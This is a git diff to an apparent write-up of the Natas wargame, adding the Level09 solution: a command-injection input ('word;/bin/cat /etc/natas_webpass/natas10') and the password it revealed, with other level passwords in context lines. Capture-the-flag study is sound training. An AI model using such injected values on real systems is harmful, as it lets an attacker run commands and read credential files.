@@ -49,8 +49,13 @@ DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ```
 #### [+] Level09
+![natas](level9.gif)
 ```
+ word;/bin/cat /etc/natas_webpass/natas10
 
+ Output:
+
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ```
 #### [+] Level10
 ```
